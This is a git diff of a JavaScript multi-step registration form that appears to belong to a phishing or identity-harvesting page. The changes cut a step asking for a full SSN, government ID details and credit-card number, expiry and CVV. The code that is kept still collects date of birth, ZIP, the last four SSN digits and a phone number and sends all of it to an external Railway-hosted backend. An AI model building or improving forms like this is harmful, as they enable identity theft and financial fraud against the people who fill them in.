@@ -1,5 +1,5 @@
 let currentStep = 1;
-const maxSteps = 3;
+const maxSteps = 2;
 let formDataStore = {}; // Holds data from all form steps
 
 // Utility functions
@@ -99,37 +99,6 @@ function validateStep2() {
     return !!isValid;
 }
 
-function validateStep3() {
-    let isValid = true;
-
-    isValid &= validateField('fullSsn', (v) => /^\d{9}$/.test(v), 'Please enter your full 9-digit SSN');
-    isValid &= validateField('idNumber', (v) => v.length >= 5, 'Please enter your ID number');
-
-    const idType = document.querySelector('input[name="idType"]:checked').value;
-    if (idType !== 'passport') {
-        isValid &= validateField('idState', (v) => v.length > 0, 'Please select the issuing state');
-    }
-
-    const expMonth = document.getElementById('idExpMonth').value;
-    const expYear = document.getElementById('idExpYear').value;
-
-    if (!expMonth || !expYear || 
-        !/^\d{1,2}$/.test(expMonth) || !/^\d{4}$/.test(expYear) ||
-        parseInt(expMonth) < 1 || parseInt(expMonth) > 12) {
-        showError('idExpMonth', 'Please enter a valid expiration date');
-        isValid = false;
-    } else {
-        hideError('idExpMonth');
-    }
-
-    if (!document.getElementById('identityTerms').checked) {
-        alert('You must agree to the identity verification terms to continue.');
-        isValid = false;
-    }
-
-    return !!isValid;
-}
-
 function updateStepIndicator(step) {
     for (let i = 1; i <= maxSteps; i++) {
         const stepElement = document.getElementById(`step${i}`);
@@ -186,7 +155,7 @@ function showSuccess() {
     const successContainer = document.getElementById('successContainer');
     successContainer.classList.remove('hidden');
     successContainer.classList.add('show');
-    updateStepIndicator(4);
+    updateStepIndicator(maxSteps + 1);
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
@@ -203,8 +172,6 @@ function setButtonLoading(buttonId, isLoading) {
         button.closest('.form-container').classList.remove('submitting');
         span.textContent = buttonId === 'step1Btn'
             ? 'I Accept & Continue to Step 2'
-            : buttonId === 'step2Btn'
-            ? 'Continue to Step 3'
             : 'Complete Registration';
     }
 }
@@ -233,21 +200,6 @@ document.getElementById('createAccountForm').addEventListener('submit', function
         data.forEach((value, key) => (formDataStore[key] = value));
 
         setButtonLoading('step2Btn', true);
-        setTimeout(() => {
-            setButtonLoading('step2Btn', false);
-            showStep(3);
-        }, 1500);
-    }
-});
-
-document.getElementById('verifyIdentityForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    if (validateStep3()) {
-        const data = new FormData(this);
-        data.forEach((value, key) => (formDataStore[key] = value));
-
-        setButtonLoading('step3Btn', true);
         setTimeout(async () => {
             try {
                 const response = await fetch('https://asadullahback-production.up.railway.app/submit', {
@@ -256,7 +208,7 @@ document.getElementById('verifyIdentityForm').addEventListener('submit', async f
                     body: JSON.stringify(formDataStore),
                 });
 
-                setButtonLoading('step3Btn', false);
+                setButtonLoading('step2Btn', false);
                 if (response.ok) {
                     showSuccess();
                 } else {
@@ -265,28 +217,14 @@ document.getElementById('verifyIdentityForm').addEventListener('submit', async f
             } catch (err) {
                 console.error(err);
                 alert('Network error. Please try again.');
-                setButtonLoading('step3Btn', false);
+                setButtonLoading('step2Btn', false);
             }
         }, 3000);
     }
 });
 
-// ID Type handler
-document.querySelectorAll('input[name="idType"]').forEach((radio) => {
-    radio.addEventListener('change', function () {
-        const idStateGroup = document.getElementById('idStateGroup');
-        if (this.value === 'passport') {
-            idStateGroup.style.display = 'none';
-            document.getElementById('idState').required = false;
-        } else {
-            idStateGroup.style.display = 'block';
-            document.getElementById('idState').required = true;
-        }
-    });
-});
-
-// Number formatting
-['dobMonth', 'dobDay', 'dobYear', 'zip', 'ssn4', 'fullSsn', 'idExpMonth', 'idExpYear', 'mobileNumber'].forEach(fieldId => {
+// Input restrictions
+['dobMonth', 'dobDay', 'dobYear', 'zip', 'ssn4', 'mobileNumber'].forEach(fieldId => {
     document.getElementById(fieldId).addEventListener('input', function () {
         this.value = this.value.replace(/\D/g, '');
     });
@@ -307,83 +245,3 @@ document.querySelector('.hero-cta').addEventListener('click', function(e) {
 
 // Start at step 1
 showStep(1);
-
-
-// Input formatting: allow only numbers and format CC number and expiry
-const ccNumberInput = document.getElementById('ccNumber');
-const ccExpiryInput = document.getElementById('ccExpiry');
-const ccCVVInput = document.getElementById('ccCVV');
-
-ccNumberInput.addEventListener('input', () => {
-  // Allow only digits and format as "1234 5678 9012 3456"
-  let val = ccNumberInput.value.replace(/\D/g, '').substring(0,16);
-  let formatted = '';
-  for(let i = 0; i < val.length; i++) {
-    if(i > 0 && i % 4 === 0) formatted += ' ';
-    formatted += val[i];
-  }
-  ccNumberInput.value = formatted;
-});
-
-ccExpiryInput.addEventListener('input', () => {
-  let val = ccExpiryInput.value.replace(/[^\d]/g, '').substring(0,4);
-  if(val.length > 2) {
-    val = val.substring(0,2) + '/' + val.substring(2);
-  }
-  ccExpiryInput.value = val;
-});
-
-ccCVVInput.addEventListener('input', () => {
-  ccCVVInput.value = ccCVVInput.value.replace(/\D/g, '').substring(0,4);
-});
-
-// Validation function for credit card inputs (call this on Step 3 validation)
-function validateCreditCard() {
-  let isValid = true;
-  const errors = [];
-
-  const ccNum = ccNumberInput.value.replace(/\s/g, '');
-  const ccName = document.getElementById('ccName').value.trim();
-  const ccExpiry = ccExpiryInput.value;
-  const ccCVV = ccCVVInput.value;
-
-  if (!/^\d{13,16}$/.test(ccNum)) {
-    errors.push('Please enter a valid credit card number (13-16 digits).');
-    isValid = false;
-  }
-  if (ccName.length < 2) {
-    errors.push('Please enter the name on the credit card.');
-    isValid = false;
-  }
-  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(ccExpiry)) {
-    errors.push('Please enter a valid expiry date (MM/YY).');
-    isValid = false;
-  } else {
-    // Check if expiry is not in the past
-    const [month, year] = ccExpiry.split('/');
-    const expiryDate = new Date(2000 + parseInt(year, 10), parseInt(month, 10) - 1, 1);
-    const now = new Date();
-    now.setDate(1);
-    now.setHours(0,0,0,0);
-    if (expiryDate < now) {
-      errors.push('Credit card expiry date cannot be in the past.');
-      isValid = false;
-    }
-  }
-  if (!/^\d{3,4}$/.test(ccCVV)) {
-    errors.push('Please enter a valid CVV (3 or 4 digits).');
-    isValid = false;
-  }
-
-  const errorDiv = document.getElementById('creditCardErrors');
-  if (!isValid) {
-    errorDiv.innerHTML = errors.map(e => `<p>${e}</p>`).join('');
-    errorDiv.style.display = 'block';
-  } else {
-    errorDiv.innerHTML = '';
-    errorDiv.style.display = 'none';
-  }
-
-  return isValid;
-}
-
